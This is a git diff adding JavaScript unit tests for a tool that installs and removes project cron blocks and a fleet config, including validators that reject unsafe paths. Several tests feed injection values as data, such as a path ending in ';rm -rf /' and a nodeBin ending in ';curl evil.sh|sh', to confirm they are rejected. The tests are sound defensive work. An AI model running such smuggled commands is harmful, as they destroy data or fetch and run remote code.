@@ -468,7 +468,7 @@ test("[#ac-3.3] a24: uninstallProject: uninstalling an unregistered project is a
   assert.equal(state.rmSyncCalls.length, 0);
 });
 
-test("[#ac-5.5] a25: uninstallProject writes in order: crontab, then fleet config, then per-project config removal", () => {
+test("[#ac-5.5/#ac-3.2] a25: last-project uninstall writes in order: crontab, then fleet-FILE removal (delete, not rewrite), then per-project config removal", () => {
   const initialCrontab = `${projectBlockFixture("demo")}\n${reaperBlockFixture()}\n`;
   const initialConfigs = {
     [fleetPathFor()]: {
@@ -482,28 +482,35 @@ test("[#ac-5.5] a25: uninstallProject writes in order: crontab, then fleet confi
       projects: [{ project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" }],
     },
   };
-  const { deps } = makeMemoryDeps({ initialCrontab, initialConfigs });
+  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });
 
   const order = [];
   const origWriteCrontab = deps.writeCrontab;
   const origWriteConfig = deps.writeConfig;
   const origRmSync = deps.rmSync;
   deps.writeCrontab = (text) => {
-    order.push("crontab");
+    order.push({ op: "crontab" });
     origWriteCrontab(text);
   };
   deps.writeConfig = (path, obj) => {
-    order.push("fleet");
+    order.push({ op: "writeConfig", path });
     origWriteConfig(path, obj);
   };
   deps.rmSync = (path, opts) => {
-    order.push("rm");
+    order.push({ op: "rm", path });
     origRmSync(path, opts);
   };
 
   uninstallProject("demo", deps);
 
-  assert.deepEqual(order, ["crontab", "fleet", "rm"]);
+  // #ac-3.2: on the LAST project the fleet file is DELETED, never rewritten to an empty fleet.
+  assert.equal(state.writeConfigCalls.length, 0, "fleet must not be writeConfig'd on last-out");
+  assert.equal(order.length, 3);
+  assert.deepEqual(order[0], { op: "crontab" });
+  assert.equal(order[1].op, "rm");
+  assert.equal(order[1].path, fleetPathFor(), "fleet PATH is rm'd, not writeConfig'd");
+  assert.equal(order[2].op, "rm");
+  assert.ok(order[2].path.endsWith("demo.json"));
 });
 
 test("[#ac-5.3] a26: removeBlock: literal marker match never over-matches a similarly-prefixed project name", () => {
@@ -925,4 +932,219 @@ test("[#ac-3.2] removeFromFleetConfig: drops only the named project's entry, lea
   ]);
   assert.equal(result.owner, "acme");
   assert.equal(result.repo, "demo-repo");
+});
+
+// ---------------------------------------------------------------------------------------------
+// Dual-review fixes — new guards (FIX 1-5). Additive; the frozen a1-a49 above stay byte-stable.
+// ---------------------------------------------------------------------------------------------
+
+test("[#ac-3.2] uninstallProject: with another project still registered the fleet is UPDATED via writeConfig (not deleted) and the reaper is retained", () => {
+  const initialCrontab = `${projectBlockFixture("demo")}\n${projectBlockFixture("other")}\n${reaperBlockFixture()}\n`;
+  const initialConfigs = {
+    [fleetPathFor()]: {
+      project: "demo",
+      owner: "acme",
+      repo: "demo-repo",
+      projectRoot: "/srv/demo",
+      stateDir: "/srv/demo/.claude/state",
+      worktreeRoot: "/srv/worktrees",
+      homeDir: "/home/harness",
+      projects: [
+        { project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" },
+        { project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" },
+      ],
+    },
+  };
+  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });
+
+  uninstallProject("demo", deps);
+
+  const fleetWrite = state.writeConfigCalls.find((c) => c.path === fleetPathFor());
+  assert.ok(fleetWrite, "remaining project must rewrite the fleet in place");
+  assert.equal(fleetWrite.obj.projects.some((p) => p.project === "demo"), false);
+  assert.ok(fleetWrite.obj.projects.some((p) => p.project === "other"));
+  assert.equal(state.rmSyncCalls.includes(fleetPathFor()), false, "fleet file must NOT be deleted while a project remains");
+  assert.ok(state.crontabText.includes("# >>> harness:reaper >>>"));
+});
+
+test("[#ac-3.2] uninstallProject: the last project deletes the fleet FILE (rmSync on reaper.json) and removes the reaper block", () => {
+  const initialCrontab = `${projectBlockFixture("demo")}\n${reaperBlockFixture()}\n`;
+  const initialConfigs = {
+    [fleetPathFor()]: {
+      project: "demo",
+      owner: "acme",
+      repo: "demo-repo",
+      projectRoot: "/srv/demo",
+      stateDir: "/srv/demo/.claude/state",
+      worktreeRoot: "/srv/worktrees",
+      homeDir: "/home/harness",
+      projects: [{ project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" }],
+    },
+  };
+  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });
+
+  uninstallProject("demo", deps);
+
+  assert.equal(state.writeConfigCalls.length, 0, "fleet must be deleted, never rewritten empty");
+  assert.ok(state.rmSyncCalls.includes(fleetPathFor()), "fleet reaper.json path must be rm'd");
+  assert.equal(state.crontabText.includes("# >>> harness:reaper >>>"), false);
+});
+
+test("[#ac-5.3] removeBlock: an opener fence with no matching closer before EOF is corruption and throws", () => {
+  const crontabText = "# >>> harness:demo >>>\n0 */4 * * * node run-cron-a.mjs\n*/5 * * * * backup.sh\n";
+  assert.throws(() => removeBlock(crontabText, "harness:demo"), /unterminated harness fence/);
+});
+
+test("[#ac-5.3] removeBlock: a CRLF-fenced block (marker lines ending in \\r) is matched and removed; non-fence lines keep their bytes", () => {
+  const crontabText =
+    "*/1 * * * * before.sh\r\n" +
+    "# >>> harness:demo >>>\r\n" +
+    "0 */4 * * * node a.mjs\r\n" +
+    "# <<< harness:demo <<<\r\n" +
+    "*/2 * * * * after.sh\r\n";
+  const result = removeBlock(crontabText, "harness:demo");
+  assert.equal(result.includes("# >>> harness:demo >>>"), false);
+  assert.equal(result, "*/1 * * * * before.sh\r\n*/2 * * * * after.sh\r\n");
+});
+
+test("[#ac-1.4/#ac-3.2] listRegisteredProjects: CRLF fence opener lines are matched (trailing \\r tolerated)", () => {
+  const crontabText =
+    "# >>> harness:demo >>>\r\n0 */4 * * * node a.mjs\r\n# <<< harness:demo <<<\r\n" +
+    "# >>> harness:reaper >>>\r\n0 3 * * * node r.mjs\r\n# <<< harness:reaper <<<\r\n";
+  assert.deepEqual(listRegisteredProjects(crontabText), ["demo"]);
+});
+
+test("[#ac-1.2] validateInstallCoordinates: a shell/cron metacharacter in homeDir throws naming only the field", () => {
+  assert.throws(
+    () => validateInstallCoordinates({ ...BASE_COORDS, homeDir: "/h;touch /tmp/x" }),
+    (err) => {
+      assert.match(err.message, /homeDir/);
+      assert.equal(err.message.includes(";"), false, "must never echo the raw value");
+      return true;
+    }
+  );
+  assert.throws(() => validateInstallCoordinates({ ...BASE_COORDS, homeDir: "/home/har ness" }), /homeDir/);
+});
+
+test("[#ac-1.2] uninstallProject: a non-string project (--uninstall with no operand) throws before the slug regex coerces it to \"undefined\"", () => {
+  assert.throws(() => uninstallProject(undefined), /invalid project/);
+});
+
+// ---------------------------------------------------------------------------------------------
+// Second hardening round — render-time cron-safety guard (FIX A), reconcile dedup (FIX B),
+// oracle-hardening for the two highest-stakes seams (FIX C). Additive; a1-a49 stay byte-stable.
+// ---------------------------------------------------------------------------------------------
+
+test("[#ac-2.3] renderProjectBlock: a scriptDir containing a space (harness checked out under \"/opt/my apps\") throws before rendering a broken cron line", () => {
+  assert.throws(
+    () =>
+      renderProjectBlock({
+        project: "demo",
+        nodeBin: NODE_BIN,
+        scriptDir: "/opt/my apps/core/vps",
+        configPath: configPathFor("demo"),
+      }),
+    /unsafe .* in cron line/
+  );
+});
+
+test("[#ac-2.3] renderProjectBlock: a nodeBin containing a shell metacharacter (\";\") throws before it can inject into the /bin/sh cron line", () => {
+  assert.throws(
+    () =>
+      renderProjectBlock({
+        project: "demo",
+        nodeBin: "/usr/bin/node;touch /tmp/x",
+        scriptDir: SCRIPT_DIR,
+        configPath: configPathFor("demo"),
+      }),
+    /unsafe nodeBin in cron line/
+  );
+});
+
+test("[#ac-2.3] renderReaperBlock: a scriptDir with a space and a reaperConfigPath with a metacharacter each throw", () => {
+  assert.throws(
+    () =>
+      renderReaperBlock({
+        nodeBin: NODE_BIN,
+        scriptDir: "/opt/my apps/core/vps",
+        reaperConfigPath: fleetPathFor(),
+      }),
+    /unsafe script path in cron line/
+  );
+  assert.throws(
+    () =>
+      renderReaperBlock({
+        nodeBin: NODE_BIN,
+        scriptDir: SCRIPT_DIR,
+        reaperConfigPath: "/home/harness/.claude/harness-crons/reaper.json;rm -rf /",
+      }),
+    /unsafe configPath in cron line/
+  );
+});
+
+test("[#ac-2.3] renderProjectBlock/renderReaperBlock: a fully clean render still succeeds (guard is not over-strict on real absolute paths)", () => {
+  assert.doesNotThrow(() => projectBlockFixture("demo"));
+  assert.doesNotThrow(() => reaperBlockFixture());
+});
+
+test("[#ac-1.3/#ac-1.4] reconcileFleet: a corrupt fleet with two \"other\" entries dedups to exactly one \"other\" plus the current project once", () => {
+  const existingFleet = {
+    project: "other",
+    owner: "acme",
+    repo: "demo-repo",
+    projectRoot: "/srv/other",
+    stateDir: "/srv/other/.claude/state",
+    worktreeRoot: "/srv/worktrees",
+    homeDir: "/home/harness",
+    projects: [
+      { project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" },
+      { project: "other", projectRoot: "/srv/other-dup", stateDir: "/srv/other-dup/.claude/state" },
+    ],
+  };
+  const snapshot = JSON.parse(JSON.stringify(existingFleet));
+
+  const fleet = reconcileFleet(existingFleet, ["other"], BASE_COORDS);
+
+  const others = fleet.projects.filter((p) => p.project === "other");
+  const demos = fleet.projects.filter((p) => p.project === "demo");
+  assert.equal(others.length, 1, "duplicate \"other\" entries must collapse to one");
+  assert.equal(demos.length, 1, "current project appears exactly once");
+  assert.equal(fleet.projects.length, 2);
+  // first-appearance order preserved: "other" before the appended current project.
+  assert.deepEqual(fleet.projects.map((p) => p.project), ["other", "demo"]);
+  assert.deepEqual(existingFleet, snapshot, "reconcileFleet must never mutate its input fleet");
+});
+
+test("[#ac-5.1] readCrontab: a status-1 stderr that CONTAINS \"crontab\" but is NOT the benign \"no crontab for \" phrase throws (defends the loose-predicate regression)", () => {
+  const fakeSpawnSync = () => ({
+    status: 1,
+    stdout: "",
+    stderr: "crontab: installing new crontab: permission denied\n",
+  });
+  assert.throws(() => readCrontab({ spawnSync: fakeSpawnSync }), /crontab -l failed/);
+});
+
+test("[#ac-5.2] writeCrontab: an already-\\n-terminated input and an empty input each pipe an input ending in EXACTLY one newline (no double newline, no bare-newline surprise)", () => {
+  const captured = [];
+  const fakeSpawnSync = (cmd, args, opts) => {
+    captured.push(opts.input);
+    return { status: 0, stdout: "", stderr: "" };
+  };
+
+  writeCrontab("x\n", { spawnSync: fakeSpawnSync });
+  writeCrontab("", { spawnSync: fakeSpawnSync });
+
+  assert.equal(captured[0], "x\n");
+  assert.equal(/\n\n$/.test(captured[0]), false);
+  assert.equal(captured[1], "\n");
+  assert.equal(/\n\n$/.test(captured[1]), false);
+});
+
+test("[#ac-5.4] installProject: an unsafe nodeBin (shell metachar) is rejected at render BEFORE any config or crontab write", () => {
+  const { deps, state } = makeMemoryDeps();
+  deps.nodeBin = "/usr/bin/node;curl evil.sh|sh";
+
+  assert.throws(() => installProject({ ...BASE_COORDS }, deps), /unsafe/i);
+  assert.equal(state.writeConfigCalls.length, 0, "no config may be written when the cron line is unsafe");
+  assert.equal(state.writeCrontabCalls.length, 0);
 });
